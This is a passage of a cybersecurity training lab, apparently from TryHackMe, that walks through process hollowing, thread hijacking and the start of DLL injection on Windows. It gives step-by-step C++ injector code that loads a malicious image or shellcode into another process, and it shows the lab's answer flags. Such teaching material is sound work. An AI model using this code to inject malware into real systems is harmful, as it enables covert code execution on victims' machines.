LPPROCESS_INFORMATION target_pi <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">PROCESS_INFORMATION</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Information about the process and primary thread</span>
CONTEXT c<span class="token punctuation">;</span> <span class="token comment">// Context structure pointer</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">CreateProcessA</span><span class="token punctuation">(</span>
	<span class="token punctuation">(</span>LPSTR<span class="token punctuation">)</span><span class="token string">"C:\\\\Windows\\\\System32\\\\svchost.exe"</span><span class="token punctuation">,</span> <span class="token comment">// Name of module to execute</span>
	<span class="token constant">NULL</span><span class="token punctuation">,</span>
	<span class="token constant">NULL</span><span class="token punctuation">,</span>
	<span class="token constant">NULL</span><span class="token punctuation">,</span>
	TRUE<span class="token punctuation">,</span> <span class="token comment">// Handles are inherited from the calling process</span>
	CREATE_SUSPENDED<span class="token punctuation">,</span> <span class="token comment">// New process is suspended</span>
	<span class="token constant">NULL</span><span class="token punctuation">,</span>
	<span class="token constant">NULL</span><span class="token punctuation">,</span>
	target_si<span class="token punctuation">,</span> <span class="token comment">// pointer to startup info</span>
	target_pi<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// pointer to process information</span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token string">"[!] Failed to create Target process. Last Error: "</span> <span class="token operator">&lt;&lt;</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
</code></pre>
<p>In step two, we need to open a malicious image to inject. This process is split into three steps, starting by using <code>CreateFileA</code> to obtain a handle for the malicious image.</p>
<pre class=" language-cpp" tabindex="0"><code class=" language-cpp">HANDLE hMaliciousCode <span class="token operator">=</span> <span class="token function">CreateFileA</span><span class="token punctuation">(</span>
	<span class="token punctuation">(</span>LPCSTR<span class="token punctuation">)</span><span class="token string">"C:\\\\Users\\\\tryhackme\\\\malware.exe"</span><span class="token punctuation">,</span> <span class="token comment">// Name of image to obtain</span>
	GENERIC_READ<span class="token punctuation">,</span> <span class="token comment">// Read-only access</span>
	FILE_SHARE_READ<span class="token punctuation">,</span> <span class="token comment">// Read-only share mode</span>
	<span class="token constant">NULL</span><span class="token punctuation">,</span>
	OPEN_EXISTING<span class="token punctuation">,</span> <span class="token comment">// Instructed to open a file or device if it exists</span>
	<span class="token constant">NULL</span><span class="token punctuation">,</span>
	<span class="token constant">NULL</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>Once a handle for the malicious image is obtained, memory must be allocated to the local process using <code>VirtualAlloc</code>. <code>GetFileSize</code> is also used to retrieve the size of the malicious image for <code>dwSize</code>.</p>
<pre class=" language-cpp" tabindex="0"><code class=" language-cpp">DWORD maliciousFileSize <span class="token operator">=</span> <span class="token function">GetFileSize</span><span class="token punctuation">(</span>
	hMaliciousCode<span class="token punctuation">,</span> <span class="token comment">// Handle of malicious image</span>
	<span class="token number">0</span> <span class="token comment">// Returns no error</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>

PVOID pMaliciousImage <span class="token operator">=</span> <span class="token function">VirtualAlloc</span><span class="token punctuation">(</span>
	<span class="token constant">NULL</span><span class="token punctuation">,</span>
	maliciousFileSize<span class="token punctuation">,</span> <span class="token comment">// File size of malicious image</span>
	<span class="token number">0x3000</span><span class="token punctuation">,</span> <span class="token comment">// Reserves and commits pages (MEM_RESERVE | MEM_COMMIT)</span>
	<span class="token number">0x04</span> <span class="token comment">// Enables read/write access (PAGE_READWRITE)</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>Now that memory is allocated to the local process, it must be written. Using the information obtained from previous steps, we can use <code>ReadFile</code> to write to local process memory.</p>
<pre class=" language-cpp" tabindex="0"><code class=" language-cpp">DWORD numberOfBytesRead<span class="token punctuation">;</span> <span class="token comment">// Stores number of bytes read</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">ReadFile</span><span class="token punctuation">(</span>
	hMaliciousCode<span class="token punctuation">,</span> <span class="token comment">// Handle of malicious image</span>
	pMaliciousImage<span class="token punctuation">,</span> <span class="token comment">// Allocated region of memory</span>
	maliciousFileSize<span class="token punctuation">,</span> <span class="token comment">// File size of malicious image</span>
	<span class="token operator">&amp;</span>numberOfBytesRead<span class="token punctuation">,</span> <span class="token comment">// Number of bytes read</span>
	<span class="token constant">NULL</span>
	<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token string">"[!] Unable to read Malicious file into memory. Error: "</span> <span class="token operator">&lt;&lt;</span><span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
	<span class="token function">TerminateProcess</span><span class="token punctuation">(</span>target_pi<span class="token operator">-&gt;</span>hProcess<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token function">CloseHandle</span><span class="token punctuation">(</span>hMaliciousCode<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>At step three, the process must be “hollowed” by un-mapping memory. Before un-mapping can occur, we must identify the parameters of the API call. We need to identify the location of the process in memory and the entry point. The CPU registers&nbsp;<code>EAX</code>&nbsp;(entry point), and&nbsp;<code>EBX</code>&nbsp;(PEB location) contain the information we need to obtain; these can be found by using&nbsp;<code>GetThreadContext</code>. Once both registers are found,&nbsp;<code>ReadProcessMemory</code>&nbsp;is used to obtain the base address from the <code>EBX</code> with an offset (<code>0x8</code>), obtained from examining the PEB.</p>
<pre class=" language-cpp" tabindex="0"><code class=" language-cpp">c<span class="token punctuation">.</span>ContextFlags <span class="token operator">=</span> CONTEXT_INTEGER<span class="token punctuation">;</span> <span class="token comment">// Only stores CPU registers in the pointer</span>
<span class="token function">GetThreadContext</span><span class="token punctuation">(</span>
	target_pi<span class="token operator">-&gt;</span>hThread<span class="token punctuation">,</span> <span class="token comment">// Handle to the thread obtained from the PROCESS_INFORMATION structure</span>
	<span class="token operator">&amp;</span>c <span class="token comment">// Pointer to store retrieved context</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Obtains the current thread context</span>

PVOID pTargetImageBaseAddress<span class="token punctuation">;</span> 
<span class="token function">ReadProcessMemory</span><span class="token punctuation">(</span>
	target_pi<span class="token operator">-&gt;</span>hProcess<span class="token punctuation">,</span> <span class="token comment">// Handle for the process obtained from the PROCESS_INFORMATION structure</span>
	<span class="token punctuation">(</span>PVOID<span class="token punctuation">)</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>Ebx <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">// Pointer to the base address</span>
	<span class="token operator">&amp;</span>pTargetImageBaseAddress<span class="token punctuation">,</span> <span class="token comment">// Store target base address </span>
	<span class="token keyword">sizeof</span><span class="token punctuation">(</span>PVOID<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">// Bytes to read </span>
	<span class="token number">0</span> <span class="token comment">// Number of bytes out</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>After the base address is stored, we can begin un-mapping memory. We can use <code>ZwUnmapViewOfSection</code> imported from <em>ntdll.dll</em> to free memory from the target process.</p>
<pre class=" language-cpp" tabindex="0"><code class=" language-cpp">HMODULE hNtdllBase <span class="token operator">=</span> <span class="token function">GetModuleHandleA</span><span class="token punctuation">(</span><span class="token string">"ntdll.dll"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Obtains the handle for ntdll</span>
pfnZwUnmapViewOfSection pZwUnmapViewOfSection <span class="token operator">=</span> <span class="token punctuation">(</span>pfnZwUnmapViewOfSection<span class="token punctuation">)</span><span class="token function">GetProcAddress</span><span class="token punctuation">(</span>
	hNtdllBase<span class="token punctuation">,</span> <span class="token comment">// Handle of ntdll</span>
	<span class="token string">"ZwUnmapViewOfSection"</span> <span class="token comment">// API call to obtain</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Obtains ZwUnmapViewOfSection from ntdll</span>

DWORD dwResult <span class="token operator">=</span> <span class="token function">pZwUnmapViewOfSection</span><span class="token punctuation">(</span>
	target_pi<span class="token operator">-&gt;</span>hProcess<span class="token punctuation">,</span> <span class="token comment">// Handle of the process obtained from the PROCESS_INFORMATION structure</span>
	pTargetImageBaseAddress <span class="token comment">// Base address of the process</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>At step four, we must begin by allocating memory in the hollowed process. We can use <code>VirtualAlloc</code> similar to <em>step two</em> to allocate memory. This time we need to obtain the size of the image found in file headers. <code>e_lfanew</code> can identify the number of bytes from the&nbsp;DOS header&nbsp;to the&nbsp;PE header. Once at the PE header, we can obtain the <code>SizeOfImage</code> from the&nbsp;Optional header.</p>
<pre class=" language-cpp" tabindex="0"><code class=" language-cpp">PIMAGE_DOS_HEADER pDOSHeader <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_DOS_HEADER<span class="token punctuation">)</span>pMaliciousImage<span class="token punctuation">;</span> <span class="token comment">// Obtains the DOS header from the malicious image</span>
PIMAGE_NT_HEADERS pNTHeaders <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_NT_HEADERS<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>LPBYTE<span class="token punctuation">)</span>pMaliciousImage <span class="token operator">+</span> pDOSHeader<span class="token operator">-&gt;</span>e_lfanew<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Obtains the NT header from e_lfanew</span>

DWORD sizeOfMaliciousImage <span class="token operator">=</span> pNTHeaders<span class="token operator">-&gt;</span>OptionalHeader<span class="token punctuation">.</span>SizeOfImage<span class="token punctuation">;</span> <span class="token comment">// Obtains the size of the optional header from the NT header structure</span>

PVOID pHollowAddress <span class="token operator">=</span> <span class="token function">VirtualAllocEx</span><span class="token punctuation">(</span>
	target_pi<span class="token operator">-&gt;</span>hProcess<span class="token punctuation">,</span> <span class="token comment">// Handle of the process obtained from the PROCESS_INFORMATION structure</span>
	pTargetImageBaseAddress<span class="token punctuation">,</span> <span class="token comment">// Base address of the process</span>
	sizeOfMaliciousImage<span class="token punctuation">,</span> <span class="token comment">// Byte size obtained from optional header</span>
	<span class="token number">0x3000</span><span class="token punctuation">,</span> <span class="token comment">// Reserves and commits pages (MEM_RESERVE | MEM_COMMIT)</span>
	<span class="token number">0x40</span> <span class="token comment">// Enabled execute and read/write access (PAGE_EXECUTE_READWRITE)</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>Once the memory is allocated, we can write the malicious file to memory. Because we are writing a file, we must first write the PE headers then the PE sections. To write PE headers, we can use&nbsp;<code>WriteProcessMemory</code>&nbsp;and the size of headers to determine where to stop.</p>
<pre class=" language-cpp" tabindex="0"><code class=" language-cpp"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">WriteProcessMemory</span><span class="token punctuation">(</span>
	target_pi<span class="token operator">-&gt;</span>hProcess<span class="token punctuation">,</span> <span class="token comment">// Handle of the process obtained from the PROCESS_INFORMATION structure</span>
	pTargetImageBaseAddress<span class="token punctuation">,</span> <span class="token comment">// Base address of the process</span>
	pMaliciousImage<span class="token punctuation">,</span> <span class="token comment">// Local memory where the malicious file resides</span>
	pNTHeaders<span class="token operator">-&gt;</span>OptionalHeader<span class="token punctuation">.</span>SizeOfHeaders<span class="token punctuation">,</span> <span class="token comment">// Byte size of PE headers </span>
	<span class="token constant">NULL</span>
<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	cout<span class="token operator">&lt;&lt;</span> <span class="token string">"[!] Writting Headers failed. Error: "</span> <span class="token operator">&lt;&lt;</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>Now we need to write each section. To find the number of sections, we can use&nbsp;&nbsp;<code>NumberOfSections</code> from the NT headers. We can loop through <code>e_lfanew</code> and the size of the current header to write each section.</p>
<pre class=" language-cpp" tabindex="0"><code class=" language-cpp"><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> pNTHeaders<span class="token operator">-&gt;</span>FileHeader<span class="token punctuation">.</span>NumberOfSections<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// Loop based on number of sections in PE data</span>
	PIMAGE_SECTION_HEADER pSectionHeader <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_SECTION_HEADER<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>LPBYTE<span class="token punctuation">)</span>pMaliciousImage <span class="token operator">+</span> pDOSHeader<span class="token operator">-&gt;</span>e_lfanew <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>IMAGE_NT_HEADERS<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>i <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>IMAGE_SECTION_HEADER<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Determines the current PE section header</span>

	<span class="token function">WriteProcessMemory</span><span class="token punctuation">(</span>
		target_pi<span class="token operator">-&gt;</span>hProcess<span class="token punctuation">,</span> <span class="token comment">// Handle of the process obtained from the PROCESS_INFORMATION structure</span>
		<span class="token punctuation">(</span>PVOID<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>LPBYTE<span class="token punctuation">)</span>pHollowAddress <span class="token operator">+</span> pSectionHeader<span class="token operator">-&gt;</span>VirtualAddress<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">// Base address of current section </span>
		<span class="token punctuation">(</span>PVOID<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>LPBYTE<span class="token punctuation">)</span>pMaliciousImage <span class="token operator">+</span> pSectionHeader<span class="token operator">-&gt;</span>PointerToRawData<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">// Pointer for content of current section</span>
		pSectionHeader<span class="token operator">-&gt;</span>SizeOfRawData<span class="token punctuation">,</span> <span class="token comment">// Byte size of current section</span>
		<span class="token constant">NULL</span>
	<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>It is also possible to use relocation tables to write the file to target memory. This will be discussed in more depth in task 6.</p>
<p>At step five, we can use&nbsp;<code>SetThreadContext</code>&nbsp;to change <code>EAX</code> to point to the entry point.</p>
<pre class=" language-cpp" tabindex="0"><code class=" language-cpp">c<span class="token punctuation">.</span>Eax <span class="token operator">=</span> <span class="token punctuation">(</span>SIZE_T<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>LPBYTE<span class="token punctuation">)</span>pHollowAddress <span class="token operator">+</span> pNTHeaders<span class="token operator">-&gt;</span>OptionalHeader<span class="token punctuation">.</span>AddressOfEntryPoint<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Set the context structure pointer to the entry point from the PE optional header</span>

<span class="token function">SetThreadContext</span><span class="token punctuation">(</span>
	target_pi<span class="token operator">-&gt;</span>hThread<span class="token punctuation">,</span> <span class="token comment">// Handle to the thread obtained from the PROCESS_INFORMATION structure</span>
	<span class="token operator">&amp;</span>c <span class="token comment">// Pointer to the stored context structure</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>At step six, we need to take the process out of a suspended state using&nbsp;<code>ResumeThread</code>.</p>
<pre class=" language-cpp" tabindex="0"><code class=" language-cpp"><span class="token function">ResumeThread</span><span class="token punctuation">(</span>
	target_pi<span class="token operator">-&gt;</span>hThread <span class="token comment">// Handle to the thread obtained from the PROCESS_INFORMATION structure</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>We can compile these steps together to create a process hollowing injector. Use the C++ injector provided and experiment with process hollowing.</p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <div><span style="font-size:1rem">Identify a PID of a process running as THM-Attacker to target. Supply the PID and executable name as arguments to execute&nbsp;<i>hollowing-</i></span><i>injector.exe</i><span style="font-size:1rem">&nbsp;located in the injectors directory on the desktop.&nbsp;</span><br></div>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="3">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Question Done
                        </button>
                        </div>
                        
                    </div><div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <p><span style="font-size:1rem">What flag is obtained after hollowing and injecting the shellcode?</span><br></p>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ***{*******************}" value="THM{7h3r35_n07h1n6_h3r3}" disabled="">
                            <input type="hidden" value="2">
                            <input type="hidden" value="3">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-4">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse4">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 4                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> Abusing Process Components
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse4" class="collapse " data-parent="#taskContent">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <p>At a high-level thread (execution) hijacking can be broken up into eleven steps:</p>
<ol>
<li>Locate and open a target process to control.</li>
<li>Allocate memory region for malicious code.</li>
<li>Write malicious code to allocated memory.</li>
<li>Identify the thread ID of the target thread to hijack.</li>
<li>Open the target thread.</li>
<li>Suspend the target thread.</li>
<li>Obtain the thread context.</li>
<li>Update the instruction pointer to the malicious code.</li>
<li>Rewrite the target thread context.</li>
<li>Resume the hijacked thread.</li>
</ol>
<p>We will break down a basic thread hijacking script to identify each of the steps and explain in more depth below.</p>
<p>The first three steps outlined in this technique following the same common steps as normal process injection. These will not be explained, instead, you can find the documented source code below.</p>
<pre class=" language-cpp" tabindex="0"><code class=" language-cpp">HANDLE hProcess <span class="token operator">=</span> <span class="token function">OpenProcess</span><span class="token punctuation">(</span>
	PROCESS_ALL_ACCESS<span class="token punctuation">,</span> <span class="token comment">// Requests all possible access rights</span>
	FALSE<span class="token punctuation">,</span> <span class="token comment">// Child processes do not inheret parent process handle</span>
	processId <span class="token comment">// Stored process ID</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
PVOIF remoteBuffer <span class="token operator">=</span> <span class="token function">VirtualAllocEx</span><span class="token punctuation">(</span>
	hProcess<span class="token punctuation">,</span> <span class="token comment">// Opened target process</span>
	<span class="token constant">NULL</span><span class="token punctuation">,</span> 
	<span class="token keyword">sizeof</span> shellcode<span class="token punctuation">,</span> <span class="token comment">// Region size of memory allocation</span>
	<span class="token punctuation">(</span>MEM_RESERVE <span class="token operator">|</span> MEM_COMMIT<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">// Reserves and commits pages</span>
	PAGE_EXECUTE_READWRITE <span class="token comment">// Enables execution and read/write access to the commited pages</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">WriteProcessMemory</span><span class="token punctuation">(</span>
	processHandle<span class="token punctuation">,</span> <span class="token comment">// Opened target process</span>
	remoteBuffer<span class="token punctuation">,</span> <span class="token comment">// Allocated memory region</span>
	shellcode<span class="token punctuation">,</span> <span class="token comment">// Data to write</span>
	<span class="token keyword">sizeof</span> shellcode<span class="token punctuation">,</span> <span class="token comment">// byte size of data</span>
	<span class="token constant">NULL</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>Once the initial steps are out of the way and our shellcode is written to memory we can move to step four. At step four, we need to begin the process of hijacking the process thread by identifying the thread ID. To identify the thread ID we need to use a trio of Windows API calls: <code>CreateToolhelp32Snapshot()</code>, <code>Thread32First()</code>, and <code>Thread32Next()</code>. These API calls will collectively loop through a snapshot of a process and extend capabilities to enumerate process information.</p>
<pre class=" language-cpp" tabindex="0"><code class=" language-cpp">THREADENTRY32 threadEntry<span class="token punctuation">;</span>

HANDLE hSnapshot <span class="token operator">=</span> <span class="token function">CreateToolhelp32Snapshot</span><span class="token punctuation">(</span> <span class="token comment">// Snapshot the specificed process</span>
	TH32CS_SNAPTHREAD<span class="token punctuation">,</span> <span class="token comment">// Include all processes residing on the system</span>
	<span class="token number">0</span> <span class="token comment">// Indicates the current process</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">Thread32First</span><span class="token punctuation">(</span> <span class="token comment">// Obtains the first thread in the snapshot</span>
	hSnapshot<span class="token punctuation">,</span> <span class="token comment">// Handle of the snapshot</span>
	<span class="token operator">&amp;</span>threadEntry <span class="token comment">// Pointer to the THREADENTRY32 structure</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">Thread32Next</span><span class="token punctuation">(</span> <span class="token comment">// Obtains the next thread in the snapshot</span>
	snapshot<span class="token punctuation">,</span> <span class="token comment">// Handle of the snapshot</span>
	<span class="token operator">&amp;</span>threadEntry <span class="token comment">// Pointer to the THREADENTRY32 structure</span>
<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
</code></pre>
<p>At step five, we have gathered all the required information in the structure pointer and can open the target thread. To open the thread we will use <code>OpenThread</code> with the <code>THREADENTRY32</code> structure pointer.</p>
<pre class=" language-cpp" tabindex="0"><code class=" language-cpp"><span class="token keyword">if</span> <span class="token punctuation">(</span>threadEntry<span class="token punctuation">.</span>th32OwnerProcessID <span class="token operator">==</span> processID<span class="token punctuation">)</span> <span class="token comment">// Verifies both parent process ID's match</span>
		<span class="token punctuation">{</span>
			HANDLE hThread <span class="token operator">=</span> <span class="token function">OpenThread</span><span class="token punctuation">(</span>
				THREAD_ALL_ACCESS<span class="token punctuation">,</span> <span class="token comment">// Requests all possible access rights</span>
				FALSE<span class="token punctuation">,</span> <span class="token comment">// Child threads do not inheret parent thread handle</span>
				threadEntry<span class="token punctuation">.</span>th32ThreadID <span class="token comment">// Reads the thread ID from the THREADENTRY32 structure pointer</span>
			<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">break</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
</code></pre>
<p>At step six, we must suspend the opened target thread. To suspend the thread we can use <code>SuspendThread</code>.</p>
<pre class=" language-cpp" tabindex="0"><code class=" language-cpp"><span class="token function">SuspendThread</span><span class="token punctuation">(</span>hThread<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>At step seven, we need to obtain the thread context to use in the upcoming API calls. This can be done using <code>GetThreadContext</code> to store a pointer.</p>
<pre class=" language-cpp" tabindex="0"><code class=" language-cpp">CONTEXT context<span class="token punctuation">;</span>
<span class="token function">GetThreadContext</span><span class="token punctuation">(</span>
	hThread<span class="token punctuation">,</span> <span class="token comment">// Handle for the thread </span>
	<span class="token operator">&amp;</span>context <span class="token comment">// Pointer to store the context structure</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>At step eight, we need to overwrite RIP (Instruction Pointer Register) to point to our malicious region of memory. If you are not already familiar with CPU registers, RIP is an x64 register that will determine the next code instruction; in a nutshell, it controls the flow of an application in memory. To overwrite the register we can update the thread context for RIP.</p>
<pre class=" language-cpp" tabindex="0"><code class=" language-cpp">context<span class="token punctuation">.</span>Rip <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD_PTR<span class="token punctuation">)</span>remoteBuffer<span class="token punctuation">;</span> <span class="token comment">// Points RIP to our malicious buffer allocation</span>
</code></pre>
<p>At step nine, the context is updated and needs to be updated to the current thread context. This can be easily done using <code>SetThreadContext</code> and the pointer for the context.</p>
<pre class=" language-cpp" tabindex="0"><code class=" language-cpp"><span class="token function">SetThreadContext</span><span class="token punctuation">(</span>
	hThread<span class="token punctuation">,</span> <span class="token comment">// Handle for the thread </span>
	<span class="token operator">&amp;</span>context <span class="token comment">// Pointer to the context structure</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>At the final step, we can now take the target thread out of a suspended state. To accomplish this we can use <code>ResumeThread</code>.</p>
<pre class=" language-cpp" tabindex="0"><code class=" language-cpp"><span class="token function">ResumeThread</span><span class="token punctuation">(</span>
	hThread <span class="token comment">// Handle for the thread</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>We can compile these steps together to create a process injector via thread hijacking. Use the C++ injector provided and experiment with thread hijacking.</p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <div><span style="font-size:1rem">Identify a PID of a process running as THM-Attacker to target. Supply the PID as an argument to execute&nbsp;<i>thread</i></span><i>-injector.exe</i><span style="font-size:1rem">&nbsp;located in the Injectors directory on the desktop.&nbsp;</span><br></div>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="4">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Question Done
                        </button>
                        </div>
                        
                    </div><div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <p>What flag is obtained after hijacking the thread?<br></p>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ***{*****************}" value="THM{w34p0n1z3d_53w1n6}" disabled="">
                            <input type="hidden" value="2">
                            <input type="hidden" value="4">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-5">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse5">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 5                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> Abusing DLLs 
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse5" class="collapse " data-parent="#taskContent">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <p><span>At a high-level <a class="tz9ZPY6k glossary-term" onclick="initPopOver(&#39;DLL&#39;, &#39;tz9ZPY6k&#39;)">DLL</a> injection can be broken up into six steps:</span></p>
<ol>
<li>Locate a target process to inject.</li>
<li>Open the target process.</li>
<li><span>Allocate memory region for malicious <a class="3jB5uEt1 glossary-term" onclick="initPopOver(&#39;DLL&#39;, &#39;3jB5uEt1&#39;)">DLL</a>.</span></li>
<li><span>Write the malicious <a class="SRWi5dYJ glossary-term" onclick="initPopOver(&#39;DLL&#39;, &#39;SRWi5dYJ&#39;)">DLL</a> to allocated memory.</span></li>
<li><span>Load and execute the malicious <a class="vc6itVeX glossary-term" onclick="initPopOver(&#39;DLL&#39;, &#39;vc6itVeX&#39;)">DLL</a>.</span></li>
</ol>
<p><span>We will break down a basic <a class="x2IE5aGz glossary-term" onclick="initPopOver(&#39;DLL&#39;, &#39;x2IE5aGz&#39;)">DLL</a> injector to identify each of the steps and explain in more depth below.</span></p>
<p><span>At step one of <a class="G7MpFwpY glossary-term" onclick="initPopOver(&#39;DLL&#39;, &#39;G7MpFwpY&#39;)">DLL</a> injection, we must locate a target thread. A thread can be located from a process using a trio of Windows API calls: </span><code>CreateToolhelp32Snapshot()</code>, <code>Process32First()</code>, and <code>Process32Next()</code>.</p>
<pre class=" language-cpp" tabindex="0"><code class=" language-cpp">DWORD <span class="token function">getProcessId</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>processName<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    HANDLE hSnapshot <span class="token operator">=</span> <span class="token function">CreateToolhelp32Snapshot</span><span class="token punctuation">(</span> <span class="token comment">// Snapshot the specificed process</span>
			TH32CS_SNAPPROCESS<span class="token punctuation">,</span> <span class="token comment">// Include all processes residing on the system</span>
